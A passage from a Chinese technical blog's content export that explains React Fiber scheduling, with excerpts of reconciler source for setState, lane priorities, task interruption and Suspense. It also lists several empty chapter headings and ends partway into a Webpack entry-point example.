class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">setState -&gt; enqueueSetState -&gt; scheduleUpdateOnFiber -&gt; ensureRootIsScheduled -&gt; ensureScheduleIsScheduled -&gt; scheduleImmediateRootScheduleTask -&gt; unstable_scheduleCallback -&gt; requestHostCallback -&gt; schedulePerformWorkUntilDeadline -&gt; port2.<span class="hljs-property">postMessage</span> -&gt; port1.<span class="hljs-property">onmessage</span> -&gt; performWorkUntilDeadline -&gt; flushWork<br><br><span class="hljs-title class_">Component</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">setState</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">partialState, callback</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">updater</span>.<span class="hljs-title function_">enqueueSetState</span>(<span class="hljs-variable language_">this</span>, partialState, callback, <span class="hljs-string">&#x27;setState&#x27;</span>);<br>&#125;;<br></code></pre></td></tr></table></figure><p>class 组件在继承 React.Component 时通过 constructor 指定 <code>instance.updater = classComponentUpdater</code>，enqueueSetState 就是 classComponentUpdater 对象的属性方法</p><p>任务调度（unstable_scheduleCallback）到任务执行（performUnitOfWork）的关键在于 flushWork 中 <code>currentTask.callback</code> 的执行。currentTask.callback 是调用 unstable_scheduleCallback 时传入的第二个参数（<code>unstable_scheduleCallback(ImmediateSchedulerPriority, processRootScheduleInImmediateTask)</code>）:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">processRootScheduleInImmediateTask -&gt; performWorkOnRoot -&gt; renderRootConcurrent -&gt; workLoopConcurrentByScheduler -&gt; performUnitOfWork<br></code></pre></td></tr></table></figure><p>此外，performWorkOnRoot 函数内在执行完 renderRootConcurrent 后会返回 exitStatus 值，用于判断完成状态，调用 finishConcurrentRender 后提交 commitRoot</p><h2 id="4-2-并发模式（Concurrent-Mode）的底层支持"><a href="#4-2-并发模式（Concurrent-Mode）的底层支持" class="headerlink" title="4.2 并发模式（Concurrent Mode）的底层支持"></a>4.2 并发模式（Concurrent Mode）的底层支持</h2><h3 id="高优先级更新的插队机制（如用户输入）"><a href="#高优先级更新的插队机制（如用户输入）" class="headerlink" title="高优先级更新的插队机制（如用户输入）"></a>高优先级更新的插队机制（如用户输入）</h3><p>Fiber 高优先级任务的插队机制 是并发模式（Concurrent Mode）的核心特性之一，它允许高优先级任务（如用户交互）中断正在执行的低优先级任务（如数据加载）</p><p>以 setState 举例说明高优先级更新的插队机制</p><p><strong>任务调度</strong></p><p>当触发 setState 更新时：</p><ol><li>创建 update 对象并标记 lane</li><li>调用 scheduleUpdateOnFiber 向上收集优先级到 root.pendingLanes</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">enqueueSetState</span>(<span class="hljs-params">inst: any, payload: any, callback</span>) &#123;<br>  <span class="hljs-keyword">const</span> fiber = <span class="hljs-title function_">getInstance</span>(inst);<br>  <span class="hljs-keyword">const</span> lane = <span class="hljs-title function_">requestUpdateLane</span>(fiber);<br>  <br>  <span class="hljs-keyword">const</span> update = <span class="hljs-title function_">createUpdate</span>(lane);<br>  update.<span class="hljs-property">payload</span> = payload;<br>  <span class="hljs-keyword">if</span> (callback !== <span class="hljs-literal">undefined</span> &amp;&amp; callback !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (__DEV__) &#123;<br>      <span class="hljs-title function_">warnOnInvalidCallback</span>(callback);<br>    &#125;<br>    update.<span class="hljs-property">callback</span> = callback;<br>  &#125;<br><br>  <span class="hljs-keyword">const</span> root = <span class="hljs-title function_">enqueueUpdate</span>(fiber, update, lane);<br>  <span class="hljs-keyword">if</span> (root !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-title function_">startUpdateTimerByLane</span>(lane, <span class="hljs-string">&#x27;this.setState()&#x27;</span>);<br>    <span class="hljs-title function_">scheduleUpdateOnFiber</span>(root, fiber, lane);<br>    <span class="hljs-title function_">entangleTransitions</span>(root, fiber, lane);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (enableSchedulingProfiler) &#123;<br>    <span class="hljs-title function_">markStateUpdateScheduled</span>(fiber, lane);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// react-reconciler/src/ReactFiberWorkLoop.js</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">scheduleUpdateOnFiber</span>(<span class="hljs-params">root, fiber, lane</span>) &#123;<br>  <span class="hljs-comment">// Mark that the root has a pending update.</span><br>  <span class="hljs-title function_">markRootUpdated</span>(root, lane); <span class="hljs-comment">// 更新 root.pendingLanes</span><br>  <span class="hljs-title function_">ensureRootIsScheduled</span>(root); <span class="hljs-comment">// 触发调度</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ensureRootIsScheduled</span>(<span class="hljs-params">root: FiberRoot</span>): <span class="hljs-keyword">void</span> &#123;<br>  mightHavePendingSyncWork = <span class="hljs-literal">true</span>;<br>  <span class="hljs-title function_">ensureScheduleIsScheduled</span>();<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ensureScheduleIsScheduled</span>(<span class="hljs-params"></span>): <span class="hljs-keyword">void</span> &#123;<br>  <span class="hljs-comment">// 在当前事件结束时，遍历每个根，并确保以正确的优先级为每个根安排了一个任务</span><br>  <span class="hljs-comment">// didScheduleMicrotask 用于防止调度冗余的 mircotask</span><br>  <span class="hljs-keyword">if</span> (__DEV__ &amp;&amp; <span class="hljs-title class_">ReactSharedInternals</span>.<span class="hljs-property">actQueue</span> !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-comment">// We&#x27;re inside an `act` scope.</span><br>    <span class="hljs-keyword">if</span> (!didScheduleMicrotask_act) &#123;<br>      didScheduleMicrotask_act = <span class="hljs-literal">true</span>;<br>      <span class="hljs-title function_">scheduleImmediateRootScheduleTask</span>();<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> (!didScheduleMicrotask) &#123;<br>      didScheduleMicrotask = <span class="hljs-literal">true</span>;<br>      <span class="hljs-title function_">scheduleImmediateRootScheduleTask</span>();<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">scheduleImmediateRootScheduleTask</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">if</span> (supportsMicrotasks) &#123;<br>    <span class="hljs-title function_">scheduleMicrotask</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-title function_">processRootScheduleInMicrotask</span>();<br>    &#125;);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// If microtasks are not supported, use Scheduler.</span><br>    <span class="hljs-title class_">Scheduler</span>_scheduleCallback(<br>      <span class="hljs-title class_">ImmediateSchedulerPriority</span>,<br>      processRootScheduleInImmediateTask,<br>    );<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>中断低优先级任务（scheduleTaskForRootDuringMicrotask）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">processRootScheduleInMicrotask</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">let</span> prev = <span class="hljs-literal">null</span>;<br>  <span class="hljs-comment">// 1. 遍历全局调度链表（firstScheduledRoot → lastScheduledRoot）</span><br>  <span class="hljs-keyword">let</span> root = firstScheduledRoot;<br>  <span class="hljs-keyword">while</span> (root !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">const</span> next = root.<span class="hljs-property">next</span>;<br>    <span class="hljs-keyword">const</span> nextLanes = <span class="hljs-title function_">scheduleTaskForRootDuringMicrotask</span>(root, currentTime);<br>    <span class="hljs-keyword">if</span> (nextLanes === <span class="hljs-title class_">NoLane</span>) &#123;<br>      root.<span class="hljs-property">next</span> = <span class="hljs-literal">null</span>;<br>      <span class="hljs-keyword">if</span> (prev === <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// This is the new head of the list</span><br>        firstScheduledRoot = next;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        prev.<span class="hljs-property">next</span> = next;<br>      &#125;<br>      <span class="hljs-keyword">if</span> (next === <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// This is the new tail of the list</span><br>        lastScheduledRoot = prev;<br>      &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">// This root still has work. Keep it in the list.</span><br>      prev = root;<br>      <span class="hljs-keyword">if</span> (<br>        syncTransitionLanes !== <span class="hljs-title class_">NoLanes</span> ||<br>        <span class="hljs-title function_">includesSyncLane</span>(nextLanes) ||<br>        (enableGestureTransition &amp;&amp; <span class="hljs-title function_">isGestureRender</span>(nextLanes))<br>      ) &#123;<br>        mightHavePendingSyncWork = <span class="hljs-literal">true</span>;<br>      &#125;<br>    &#125;<br>    root = next;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">scheduleTaskForRootDuringMicrotask</span>(<span class="hljs-params"></span><br><span class="hljs-params">  root: FiberRoot,</span><br><span class="hljs-params">  currentTime: number,</span><br><span class="hljs-params"></span>): <span class="hljs-title class_">Lane</span> &#123;<br>  <span class="hljs-title function_">markStarvedLanesAsExpired</span>(root, currentTime);<br>  <span class="hljs-keyword">const</span> nextLanes = <span class="hljs-title function_">getNextLanes</span>(<br>    root,<br>    root === workInProgressRoot ? workInProgressRootRenderLanes : <span class="hljs-title class_">NoLanes</span>,<br>    rootHasPendingCommit);<br>  <br>  <span class="hljs-keyword">const</span> existingCallbackNode = root.<span class="hljs-property">callbackNode</span>;<br>  <span class="hljs-keyword">if</span> (<br>    nextLanes === <span class="hljs-title class_">NoLanes</span> ||<br>    (root === workInProgressRoot &amp;&amp; <span class="hljs-title function_">isWorkLoopSuspendedOnData</span>()) ||<br>    root.<span class="hljs-property">cancelPendingCommit</span> !== <span class="hljs-literal">null</span><br>  ) &#123;<br>    <span class="hljs-comment">// Fast path: There&#x27;s nothing to work on.</span><br>    <span class="hljs-keyword">if</span> (existingCallbackNode !== <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-title function_">cancelCallback</span>(existingCallbackNode);<br>    &#125;<br>    root.<span class="hljs-property">callbackNode</span> = <span class="hljs-literal">null</span>;<br>    root.<span class="hljs-property">callbackPriority</span> = <span class="hljs-title class_">NoLane</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">NoLane</span>;<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span> (<br>    <span class="hljs-title function_">includesSyncLane</span>(nextLanes) &amp;&amp;<br>    <span class="hljs-comment">// If we&#x27;re prerendering, then we should use the concurrent work loop</span><br>    <span class="hljs-comment">// even if the lanes are synchronous, so that prerendering never blocks</span><br>    <span class="hljs-comment">// the main thread.</span><br>    !<span class="hljs-title function_">checkIfRootIsPrerendering</span>(root, nextLanes)<br>  ) &#123;<br>    <span class="hljs-comment">// Synchronous work is always flushed at the end of the microtask, so we</span><br>    <span class="hljs-comment">// don&#x27;t need to schedule an additional task.</span><br>    <span class="hljs-keyword">if</span> (existingCallbackNode !== <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-title function_">cancelCallback</span>(existingCallbackNode);<br>    &#125;<br>    root.<span class="hljs-property">callbackPriority</span> = <span class="hljs-title class_">SyncLane</span>;<br>    root.<span class="hljs-property">callbackNode</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">SyncLane</span>;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// We use the highest priority lane to represent the priority of the callback.</span><br>    <span class="hljs-keyword">const</span> existingCallbackPriority = root.<span class="hljs-property">callbackPriority</span>;<br>    <span class="hljs-keyword">const</span> newCallbackPriority = <span class="hljs-title function_">getHighestPriorityLane</span>(nextLanes);<br><br>    <span class="hljs-keyword">if</span> (<br>      newCallbackPriority === existingCallbackPriority &amp;&amp;<br>      <span class="hljs-comment">// Special case related to `act`. If the currently scheduled task is a</span><br>      <span class="hljs-comment">// Scheduler task, rather than an `act` task, cancel it and re-schedule</span><br>      <span class="hljs-comment">// on the `act` queue.</span><br>      !(<br>        __DEV__ &amp;&amp;<br>        <span class="hljs-title class_">ReactSharedInternals</span>.<span class="hljs-property">actQueue</span> !== <span class="hljs-literal">null</span> &amp;&amp;<br>        existingCallbackNode !== fakeActCallbackNode<br>      )<br>    ) &#123;<br>      <span class="hljs-comment">// The priority hasn&#x27;t changed. We can reuse the existing task.</span><br>      <span class="hljs-keyword">return</span> newCallbackPriority;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">// Cancel the existing callback. We&#x27;ll schedule a new one below.</span><br>      <span class="hljs-title function_">cancelCallback</span>(existingCallbackNode);<br>    &#125;<br><br>    <span class="hljs-keyword">const</span> newCallbackNode = <span class="hljs-title function_">scheduleCallback</span>(<br>      schedulerPriorityLevel,<br>      performWorkOnRootViaSchedulerTask.<span class="hljs-title function_">bind</span>(<span class="hljs-literal">null</span>, root),<br>    );<br><br>    root.<span class="hljs-property">callbackPriority</span> = newCallbackPriority;<br>    root.<span class="hljs-property">callbackNode</span> = newCallbackNode;<br>    <span class="hljs-keyword">return</span> newCallbackPriority;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>插队机制关键解析</strong></p><p>（1）标记过期任务</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">markStarvedLanesAsExpired</span>(root, currentTime);<br></code></pre></td></tr></table></figure><ul><li>作用：检查 root.pendingLanes 中是否有低优先级任务因长期未执行而“饿死”（超过 timeout 未处理）</li><li>插队机制：将过期的低优先级任务标记为 expiredLanes 使其升级为同步优先级（SyncLane）从而获得立即执行的机会</li></ul><p>（2）计算下一个要处理的 lanes（getNextLanes）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> nextLanes = <span class="hljs-title function_">getNextLanes</span>(<br>  root,<br>  root === workInProgressRoot ? workInProgressRootRenderLanes : <span class="hljs-title class_">NoLanes</span>,<br>  rootHasPendingCommit<br>);<br></code></pre></td></tr></table></figure><ul><li>优先级比较：从 pendingLanes 中选择最高优先级的 lanes，规则包括：<ul><li>优先选择已过期的 expiredLanes（相当于强制插队）</li><li>然后选择用户交互相关的 InputContinuousLane 或 DefaultLane</li><li>避免与正在进行的渲染任务冲突</li></ul></li></ul><p>（3）中断低优先级</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">if</span> (existingCallbackNode !== <span class="hljs-literal">null</span>) &#123;<br>  <span class="hljs-title function_">cancelCallback</span>(existingCallbackNode); <span class="hljs-comment">// 取消当前正在执行的低优先级任务</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>当检测到更高优先级的 newCallbackPriority 时，立即取消当前任务的回调执行。</li></ul><p>（4）调度新任务</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> newCallbackNode = <span class="hljs-title function_">scheduleCallback</span>(<br>  schedulerPriorityLevel,<br>  performWorkOnRootViaSchedulerTask.<span class="hljs-title function_">bind</span>(<span class="hljs-literal">null</span>, root)<br>);<br></code></pre></td></tr></table></figure><h3 id="Suspense的异步渲染流程"><a href="#Suspense的异步渲染流程" class="headerlink" title="Suspense的异步渲染流程"></a>Suspense的异步渲染流程</h3><p>Suspense 的异步渲染流程主要围绕 <code>异步数据加载</code> 和 <code>懒加载组件（Code Splitting）</code> 两大场景展开。Suspense 的工作原理是捕获子组件抛出的 Promise，并在 Promise 未完成时显示 fallback UI。</p><p>其异步状态管理的逻辑如下：</p><ul><li>当子组件（如 lazy 组件或使用 use Hook 的组件）需要等待异步操作（如数据加载或代码加载）时，它会 抛出一个 Promise。</li><li>Suspense 会捕获这个 Promise，并进入 挂起（Suspended）状态，显示 fallback UI。</li><li>当 Promise 完成（resolve 或 reject），React 会重新尝试渲染子组件。</li></ul><p><strong>渲染流程详解</strong></p><p>（1）Code Splitting（懒加载组件）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">LazyComponent</span> = <span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&quot;./Component&quot;</span>));<br></code></pre></td></tr></table></figure><ul><li>lazy 返回一个特殊对象（LazyComponent），包含 <code>_status</code>（<code>Pending/Resolved/Rejected</code>）和 <code>_result</code>（加载的模块）。</li><li>首次渲染时，readLazyComponentType 检查状态：<ul><li>若 Pending，抛出 thenable（Promise），触发 Suspense 显示 fallback。</li><li>若 Resolved，返回模块并渲染</li></ul></li></ul><p>（2）数据获取（Async Data Fetching）<br>实验性 API <code>unstable_createResource</code> 允许在组件内同步读取异步数据：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> resource = <span class="hljs-title function_">unstable_createResource</span>(fetchData);<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">MyComponent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> data = resource.<span class="hljs-title function_">read</span>(id); <span class="hljs-comment">// 可能抛出 Promise</span><br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;data&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>resource.read 检查缓存：<ul><li>若数据未加载，抛出 Promise，Suspense 捕获并显示 fallback。</li><li>若数据已加载，直接返回6。</li></ul></li><li>React 在微任务阶段重新尝试渲染完成加载的组件</li></ul><h2 id="4-3-实际案例：startTransition的工作原理"><a href="#4-3-实际案例：startTransition的工作原理" class="headerlink" title="4.3 实际案例：startTransition的工作原理"></a>4.3 实际案例：startTransition的工作原理</h2><h1 id="第五章：Fiber的渲染流程剖析"><a href="#第五章：Fiber的渲染流程剖析" class="headerlink" title="第五章：Fiber的渲染流程剖析"></a>第五章：Fiber的渲染流程剖析</h1><h2 id="5-1-两阶段提交模型详解"><a href="#5-1-两阶段提交模型详解" class="headerlink" title="5.1 两阶段提交模型详解"></a>5.1 两阶段提交模型详解</h2><h3 id="Render阶段（可中断）：Reconciliation与Effect收集"><a href="#Render阶段（可中断）：Reconciliation与Effect收集" class="headerlink" title="Render阶段（可中断）：Reconciliation与Effect收集"></a>Render阶段（可中断）：Reconciliation与Effect收集</h3><h3 id="Commit阶段（不可中断）：DOM更新与生命周期执行"><a href="#Commit阶段（不可中断）：DOM更新与生命周期执行" class="headerlink" title="Commit阶段（不可中断）：DOM更新与生命周期执行"></a>Commit阶段（不可中断）：DOM更新与生命周期执行</h3><h2 id="5-2-双缓存树切换的完整流程"><a href="#5-2-双缓存树切换的完整流程" class="headerlink" title="5.2 双缓存树切换的完整流程"></a>5.2 双缓存树切换的完整流程</h2><h3 id="从WorkInProgress树到Current树的切换时机"><a href="#从WorkInProgress树到Current树的切换时机" class="headerlink" title="从WorkInProgress树到Current树的切换时机"></a>从WorkInProgress树到Current树的切换时机</h3><h3 id="错误边界与渲染恢复机制"><a href="#错误边界与渲染恢复机制" class="headerlink" title="错误边界与渲染恢复机制"></a>错误边界与渲染恢复机制</h3><h1 id="第六章：Fiber的性能优化实践"><a href="#第六章：Fiber的性能优化实践" class="headerlink" title="第六章：Fiber的性能优化实践"></a>第六章：Fiber的性能优化实践</h1><h2 id="6-1-减少协调开销的优化策略"><a href="#6-1-减少协调开销的优化策略" class="headerlink" title="6.1 减少协调开销的优化策略"></a>6.1 减少协调开销的优化策略</h2><h3 id="React-memo、useMemo、useCallback的原理与误用"><a href="#React-memo、useMemo、useCallback的原理与误用" class="headerlink" title="React.memo、useMemo、useCallback的原理与误用"></a>React.memo、useMemo、useCallback的原理与误用</h3><h3 id="不可变数据与SCU（shouldComponentUpdate）优化"><a href="#不可变数据与SCU（shouldComponentUpdate）优化" class="headerlink" title="不可变数据与SCU（shouldComponentUpdate）优化"></a>不可变数据与SCU（shouldComponentUpdate）优化</h3><h2 id="6-2-调试工具与性能分析"><a href="#6-2-调试工具与性能分析" class="headerlink" title="6.2 调试工具与性能分析"></a>6.2 调试工具与性能分析</h2><h3 id="React-DevTools的Fiber树-inspection"><a href="#React-DevTools的Fiber树-inspection" class="headerlink" title="React DevTools的Fiber树 inspection"></a>React DevTools的Fiber树 inspection</h3><h3 id="使用Profiler-API定位渲染瓶颈"><a href="#使用Profiler-API定位渲染瓶颈" class="headerlink" title="使用Profiler API定位渲染瓶颈"></a>使用Profiler API定位渲染瓶颈</h3><h1 id="第七章：Fiber的延伸与生态系统影响"><a href="#第七章：Fiber的延伸与生态系统影响" class="headerlink" title="第七章：Fiber的延伸与生态系统影响"></a>第七章：Fiber的延伸与生态系统影响</h1><h2 id="7-1-Fiber架构的通用性设计"><a href="#7-1-Fiber架构的通用性设计" class="headerlink" title="7.1 Fiber架构的通用性设计"></a>7.1 Fiber架构的通用性设计</h2><h3 id="自定义渲染器（如React-Three-Fiber）的实现原理"><a href="#自定义渲染器（如React-Three-Fiber）的实现原理" class="headerlink" title="自定义渲染器（如React Three Fiber）的实现原理"></a>自定义渲染器（如React Three Fiber）的实现原理</h3><h3 id="非DOM环境（React-Native）的Fiber适配"><a href="#非DOM环境（React-Native）的Fiber适配" class="headerlink" title="非DOM环境（React Native）的Fiber适配"></a>非DOM环境（React Native）的Fiber适配</h3><h2 id="7-2-其他框架的借鉴与对比"><a href="#7-2-其他框架的借鉴与对比" class="headerlink" title="7.2 其他框架的借鉴与对比"></a>7.2 其他框架的借鉴与对比</h2><h3 id="Vue-3的调度器设计-vs-React-Fiber"><a href="#Vue-3的调度器设计-vs-React-Fiber" class="headerlink" title="Vue 3的调度器设计 vs React Fiber"></a>Vue 3的调度器设计 vs React Fiber</h3><h3 id="Svelte的编译时优化与运行时调度的取舍"><a href="#Svelte的编译时优化与运行时调度的取舍" class="headerlink" title="Svelte的编译时优化与运行时调度的取舍"></a>Svelte的编译时优化与运行时调度的取舍</h3><h1 id="第八章：从源码角度理解Fiber"><a href="#第八章：从源码角度理解Fiber" class="headerlink" title="第八章：从源码角度理解Fiber"></a>第八章：从源码角度理解Fiber</h1><h2 id="8-1-关键源码文件导读"><a href="#8-1-关键源码文件导读" class="headerlink" title="8.1 关键源码文件导读"></a>8.1 关键源码文件导读</h2><h3 id="react-reconciler包的核心逻辑"><a href="#react-reconciler包的核心逻辑" class="headerlink" title="react-reconciler包的核心逻辑"></a>react-reconciler包的核心逻辑</h3><h3 id="beginWork、completeWork函数解析"><a href="#beginWork、completeWork函数解析" class="headerlink" title="beginWork、completeWork函数解析"></a>beginWork、completeWork函数解析</h3><h2 id="8-2-手写迷你Fiber引擎"><a href="#8-2-手写迷你Fiber引擎" class="headerlink" title="8.2 手写迷你Fiber引擎"></a>8.2 手写迷你Fiber引擎</h2><h3 id="实现一个简化版Fiber调度器（300行代码Demo）"><a href="#实现一个简化版Fiber调度器（300行代码Demo）" class="headerlink" title="实现一个简化版Fiber调度器（300行代码Demo）"></a>实现一个简化版Fiber调度器（300行代码Demo）</h3>]]></content>
    
    
    <categories>
      
      <category>React</category>
      
    </categories>
    
    
    <tags>
      
      <tag>React</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Webpack 学习笔记</title>
    <link href="/2025/05/29/Webpack%20Study%20Notes/"/>
    <url>/2025/05/29/Webpack%20Study%20Notes/</url>
    
    <content type="html"><![CDATA[<h2 id="入口起点（entry-point）"><a href="#入口起点（entry-point）" class="headerlink" title="入口起点（entry point）"></a>入口起点（entry point）</h2><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p>语法：entry: string | [string] | { <entryChunkName> string | [string] } | {}</p><p><strong>webpack.config.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs Javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">entry</span>: &#123;<br>    <span class="hljs-attr">app</span>: <span class="hljs-string">&#x27;./src/app.js&#x27;</span>,<br>    <span class="hljs-attr">file</span>: [<span class="hljs-string">&#x27;./src/file_1.js&#x27;</span>, <span class="hljs-string">&#x27;./src/file_2.js&#x27;</span>],<br>    <span class="hljs-attr">a1</span>: &#123;<br>      <span class="hljs-attr">dependOn</span>: <span class="hljs-string">&#x27;app&#x27;</span>, <span class="hljs-comment">// 